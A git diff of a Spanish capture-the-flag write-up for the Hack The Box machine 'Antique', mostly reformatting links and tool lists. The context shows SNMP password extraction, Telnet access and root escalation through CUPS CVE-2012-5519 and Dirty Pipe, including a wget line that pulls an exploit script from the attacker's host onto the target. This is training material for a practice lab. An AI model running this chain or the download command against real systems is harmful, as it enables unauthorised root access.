@@ -17,11 +17,11 @@ tags:
   - UDP Scan
   - SNMP Enumeration
   - Abusing Telnet Privileges
-  - CUPS 1.6.1
+  - CUPS
   - CUPS Administration Exploit
-  - CVE-2012-5519
+  - Privesc - CVE-2012-5519 (CUPS Administration Exploit)
   - Dirty Pipe Exploitation
-  - CVE-2022-0847
+  - Privesc - CVE-2022-0847 (Dirty Pipe)
   - OSCP Style
   - Metasploit Framework
 ---
@@ -30,6 +30,7 @@ tags:
 Esta fue una máquina bastante interesante, haciendo los escaneos correspondientes, únicamente, encontramos un puerto abierto que corre el servicio **Telnet**, al no encontrar nada más, buscamos por **UDP** y encontramos el **puerto 161** donde corre el servicio **SNMP**. De ahí, encontramos la contraseña para acceder a **Telnet** y abusando de los privilegios, obtenemos una shell de forma remota. Para escalar privilegios, utilizamos el privilegio **lpadmin** y el CVE-2012-5519 para explotarlo y obtener la flag del **Root**.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *telnet*
 * *snmpwalk*
@@ -48,9 +49,9 @@ Herramientas utilizadas:
 * *html2text*
 * *wget*
 * *chmod*
-* *msfconsole*
-* *exploit/multi/handler*
-* *multi/escalate/cups_root_file_read*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/multi/handler*
+* *Módulo: multi/escalate/cups_root_file_read*
 * *cupsctl*
 * *chisel*
 * *gunzip*
@@ -109,6 +110,7 @@ Herramientas utilizadas:
 
 
 <h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
 ```bash
 ping -c 4 10.10.11.107
@@ -276,7 +278,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
 <br>
 
 Aquí información que nos comparte NMAP sobre esta clase de escaneos:
-* https://nmap.org/book/scan-methods-udp-scan.html
+* <a href="https://nmap.org/book/scan-methods-udp-scan.html" target="_blank">UDP Scan (-sU)</a>
 
 Y nos muestra un puerto abierto, que es del servicio **SNMP**, busquemos información sobre este servicio:
 
@@ -287,7 +289,7 @@ Y nos muestra un puerto abierto, que es del servicio **SNMP**, busquemos informa
 <br>
 
 Excelente, ya sabemos por donde comenzaremos a vulnerar la máquina. En el siguiente blog, se explica como enumerar este servicio:
-* https://hackinglethani.com/es/protocolo-snmp/
+* <a href="https://hackinglethani.com/es/protocolo-snmp/" target="_blank">Protocolo SNMP</a>
 
 
 <br>
@@ -310,8 +312,8 @@ De acuerdo al blog que vimos, vamos a utilizar la herramienta **snmpwalk**.
 <br>
 
 En resumen, esta herramienta nos sirve para enumerar el **servicio SNMP**, aunque puede no funcionar. Te dejo más información en el siguiente link:
-* https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-snmp
-* https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/
+* <a href="https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-snmp" target="_blank">HackTricks: 161,162,10161,10162/udp - Pentesting SNMP</a>
+* <a href="https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/" target="_blank">Tutorial de SNMP: ¿cómo funcionan snmpwalk y snmpget?</a>
 
 Con la herramienta **snmpwalk** no se solicita tan solo un registro de datos concreto del **dispositivo SNMP**, sino también registros de datos que le sigan (útil en el caso de tablas, por ejemplo).
 
@@ -328,6 +330,8 @@ Ahora veamos lo que nos dice la herramienta sobre este parámetro:
 | **Funcionamiento de OID en snmpwalk** |
 |:-----------:|
 | *Se puede proporcionar un identificador de objeto (OID) en la línea de comando. Este OID especifica qué parte del espacio del identificador de objeto se buscará mediante solicitudes GETNEXT. Se consultan todas las variables en el subárbol debajo del OID dado y se presentan sus valores al usuario. Cada nombre de variable se da en el formato especificado en variables(5). Si no hay un argumento OID presente, snmpwalk buscará el subárbol enraizado en SNMPv2-SMI::mib-2 (incluidos los valores de objetos MIB de otros módulos MIB, que se definen como pertenecientes a este subárbol). Si la entidad de la red tiene un error al procesar el paquete de solicitud, se devolverá un paquete de error y se mostrará un mensaje que ayudará a identificar por qué la solicitud se formó incorrectamente. Si la búsqueda en árbol provoca intentos de búsqueda más allá del final de la MIB, se mostrará el mensaje "Fin de la MIB".* |
+
+<br>
 
 Además para que funcione la herramienta, necesitamos consultar los **OIDs** almacenados en un **MIB** (que por defecto **snmpwalk** usa el módulo **SNMPv2-SMI::mib-2** que consulta **OIDs** especificos del **MIB-2**).
 
@@ -386,7 +390,7 @@ SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB Vi
 Si intentas con otro número que no sea 1, saldrá error.
 
 En la siguiente página, nos indican que tenemos **OIDs** que pueden mostrar directamente la contraseña de **JetDirect**:
-* https://www.irongeek.com/i.php?page=security/networkprinterhacking
+* <a href="https://www.irongeek.com/i.php?page=security/networkprinterhacking" target="_blank">Hacking Network Printers (Mostly HP JetDirects, but a little info on the Ricoh Savins)</a>
 
 Vamos a intentarlo:
 ```bash
@@ -635,7 +639,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*
 No conozco ese puerto, vamos a investigarlo.
 
 Mira lo que encontre:
-* https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp
+* <a href="https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp" target="_blank">HackTricks: 631 - Internet Printing Protocol(IPP)</a>
 
 Al parecer nos puede mostrar una página web, veamos si tenemos **curl** en la máquina:
 ```bash
@@ -707,7 +711,7 @@ Vamos a ocupar primero el Exploit de **GitHub** y luego el de **Metasploit**.
 <h3 id="CUPS2">Probando Exploit: cups-root-file-read.sh (CVE-2012-5519) de GitHub</h3>
 
 Aquí lo puedes encontrar:
-* https://github.com/p1ckzi/CVE-2012-5519
+* <a href="https://github.com/p1ckzi/CVE-2012-5519" target="_blank">Repositorio de p1ckzi: cups-root-file-read.sh</a>
 
 Para que el Exploit funcione, el usuario debe estar en el grupo **lpadmin**, que ya comprobamos que si lo esta.
 
@@ -736,7 +740,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```bash
 lp@antique:~$ wget http://Tu_IP/cups-root-file-read.sh
 --2023-05-17 22:41:31--  http://Tu_IP/cups-root-file-read.sh
-Connecting to 10.10.14.9:80... connected.
+Connecting to Tu_IP:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 13027 (13K) [text/x-sh]
 Saving to: ‘cups-root-file-read.sh’
@@ -826,6 +830,7 @@ Listo, ya tenemos la completada la máquina.
 Para que podamos usar este módulo de **Metasploit**, necesitamos obtener una sesión de **Meterpreter**.
 
 Vamos a obtenerla por pasos:
+
 * Para hacerlo de forma rapida, vamos a crear un archivo que tenga el **handler** ya configurado, lo puedes hacer así:
 ```bash
 nano handler.rc
@@ -1020,14 +1025,14 @@ curl http://localhost:631/admin/log/error_log
 105493e09fd1843b6349912d09080136
 ```
 Excelente, igual en el siguiente blog explican bastante bien como funciona este Exploit:
-* https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read
+* <a href="https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read" target="_blank">CUPS 1.6.1 Root File Read - Metasploit</a>
 
 Con esto podemos concluir la máquina, pero quiero hacer una par de cosas más.
 
 <h2 id="Chisel">Viendo Página de CUPS 1.6.1 con Chisel</h2>
 
 Vamos a descargar la última versión del Chisel, aca te lo dejo (descargue la versión **chisel_1.10.0_linux_amd64.gz**):
-* https://github.com/jpillora/chisel/releases/tag/v1.10.0
+* <a href="https://github.com/jpillora/chisel/releases/tag/v1.10.0" target="_blank">Repositorio de jpillora: Chisel - Releases</a>
 
 Y descomprimelo, si quieres cambiale el nombre y dale permisos de ejecución:
 ```bash
@@ -1110,11 +1115,12 @@ which gcc
 ```
 
 En el **GitHub** del maestro **Alexis Ahmed** (un grande este master), explica como usar este Exploit:
-* https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+* <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" target="_blank">Repositorio de AlexisAhmed: CVE-2022-0847-DirtyPipe-Exploits</a>
 
 No es necesario que descargues su versión, ya que es la misma que ya tiene Kali aunque igual puedes ocuparla.
 
 Vamos por pasos:
+
 * Busquemos el Exploit en Kali:
 ```bash
 searchsploit dirty pipe
@@ -1217,6 +1223,7 @@ Y listo, tremendo este Exploit.
 * https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read
 * https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp
 * https://github.com/jpillora/chisel/releases/tag/v1.10.0
+
 
 <br>
 # FIN
